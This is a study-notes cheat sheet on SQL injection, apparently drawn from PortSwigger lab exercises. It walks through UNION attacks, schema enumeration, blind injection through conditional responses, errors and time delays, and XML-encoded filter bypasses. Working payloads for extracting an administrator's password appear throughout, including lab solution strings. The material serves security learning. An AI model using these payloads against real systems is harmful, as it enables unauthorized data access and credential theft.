## Sql injection cheat sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet

## General tips 
On MySQL, the double-dash sequence '--' must be followed by a space. 
Sql injection can be in url, req.body, cookie etc...  
In case you try for sqli in a cookie don't forget to url encode ";" character, because backend will treat it as a cookie seperator instead of treating it as an sql query separator, for example:
```
TrackingId=yXIQDkw8Dfm6XJs8'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(5) END--; session=PzQeFsR8qhCAQsIiCCc63Uo3osS8zIje
```
__If we use `TrackingId=yXIQDkw8Dfm6XJs8';` instead of `TrackingId=yXIQDkw8Dfm6XJs8'%3B` backend will assume that `;` is a separation between `TrackingId` and `Session` cookies. But we want it to be a separation between sql queries__

## Most common example:
Let's say there's a url:  
https://insecure-website.com/products?category=Gifts  
On the server it'll be:  
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
``` 
What we can do:  
```
https://insecure-website.com/products?category=Gifts'--  
```
And we'll see not only released products but all of them

# Retrieving data from other database tables (UNION attacks)
In cases where the application responds with the results of a SQL query, an attacker can use a SQL injection vulnerability to retrieve data from other tables within the database. You can use the 'UNION' keyword to execute an additional 'SELECT' query and append the results to the original query. 

For example, if an application executes the following query containing the user input 'Gifts':
```
SELECT name, description FROM products WHERE category = 'Gifts'
```
An attacker can submit the input: 
```
' UNION SELECT username, password FROM users--
```

For a UNION query to work, two key requirements must be met:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

## Determine num of columns returned
There are two effective methods to determine how many columns are being returned
- One method involves injecting a series of ORDER BY clauses and incrementing the specified column index __until an error occurs__

> 'ORDER BY' is better for determining the num of returned columns because Oracle requires 'FROM dual' part after UNION SELECT  
> Example of sqli for oracle db: ' UNION SELECT NULL FROM DUAL--  
> __However sometimes servers may be protected against ORDER BY and may not be protected agianst UNION__
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
- The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values: 
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
If the number of nulls does not match the number of columns, the database returns an error

### Finding columns with a useful data type
After you determine the number of required columns, you can probe each column to test whether it can hold string data.
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
If the column data type is not compatible with string data, the injected query will cause a database error

In this way you can figure out which columns return string data. Let's say second column contains string data, in that case we can put password under the second column 
```
' UNION SELECT username, password FROM users--
```

## Retrieving multiple values within a single column
In some cases the query in the previous example may only return a single column. 
On Oracle you could submit the input: 
```
' UNION SELECT username || '~' || password FROM users--
```
Different databases use different syntax to perform string concatenation. For more details, see the SQL injection cheat sheet.

# Examining the database
## Get db version
Database type |	Query
---|---
Microsoft, MySQL | 	SELECT @@version
Oracle | 	SELECT * FROM v$version
PostgreSQL 	| SELECT version() 

For example, you could use a UNION attack with the following input:
```
' UNION SELECT @@version--
```

## Listing the contents of the database
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query 'information_schema.tables' to list the tables in the database:
```
SELECT * FROM information_schema.tables
```
This returns output like the following: 
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
This output indicates that there are three tables, called 'Products', 'Users', and 'Feedback'. 

You can then query 'information_schema.columns' to list the columns in individual tables: 
```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
This returns output like the following: 
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

## Listing the contents of an Oracle database
On Oracle, you can find the same information as follows:
- You can list tables by querying all_tables:
```
SELECT * FROM all_tables
```
- You can list columns by querying all_tab_columns:
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

# Blind SQL injection vulnerabilities
## Blind SQL injection with conditional responses
Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
When a request containing a 'TrackingId' cookie is processed, the application uses a SQL query to determine whether this is a known user: 
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
The application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response

To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn: 
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
- The first of these values causes the query to return results, because the injected 'AND '1'='1' condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

__This allows us to determine the answer to any single injected condition, and extract data one piece at a time.__

For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time. 
```
...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.

Eventually we'll run something like:
```
' AND (SELECT substring(password,1,1) FROM users WHERE username = 'Administrator') = 'a'--'
```

__We can continue this process to systematically determine the full password for the Administrator user.__ 

## Exploiting blind SQL injection by triggering conditional errors
It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message

To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn: 
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a -- 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time: 
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

### Example of LAB: Blind SQL injection with conditional errors
- First figure out what kind of db we're dealing with
Missed this step in this lab

- Make sure we only get an error when we intentionally throw it
```
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)='1' --
```

- Make sure user exists
```
' AND (SELECT CASE WHEN ((SELECT username FROM users WHERE username = 'administrator')='administrator') THEN '1' ELSE TO_CHAR(1/0) END FROM dual)='1'
``` 

- Find the first letter of the password
```
' AND (SELECT CASE WHEN ((SELECT SUBSTR(password, 1, 1) FROM users WHERE username = 'administrator')='a') THEN 'a' ELSE TO_CHAR(1/0) END FROM dual)='a' --
```

## Extracting sensitive data via verbose SQL error messages
Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an id parameter:
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = ```. Expected char
```
This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a WHERE statement. This makes it easier to construct a valid query containing a malicious payload

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one. 

You can use the CAST() function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement: 
```
CAST((SELECT example_column FROM example_table) AS int)
```
Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following: 
```
ERROR: invalid input syntax for type integer: "Example data"
```
__This type of query may also be useful if a character limit prevents you from triggering conditional responses.__ 

Example of solving the lab
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --; session=ddjF2R5IenO8KIGjeqTicUFnEAd0drbD23

## Exploiting blind SQL injection by triggering time delays
If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true: 
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
- The first of these inputs does not trigger a delay, because the condition 1=2 is false.
- The second input triggers a delay of 10 seconds, because the condition 1=1 is true.

Using this technique, we can retrieve data by testing one character at a time: 
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

Example of a solved lab:
```
TrackingId=x'||pg_sleep(10)--
```

## SQL injection in different contexts
You can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT: 
```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
This will be decoded server-side before being passed to the SQL interpreter. 

Lab: SQL injection with filter bypass via XML encoding
> Note
> 
> ' is not always needed in sqli

Lab solution:
1 &#x41;ND 1=2 &#x55;NION &#x53;ELECT password FROM users &#x2D;&#x2D;

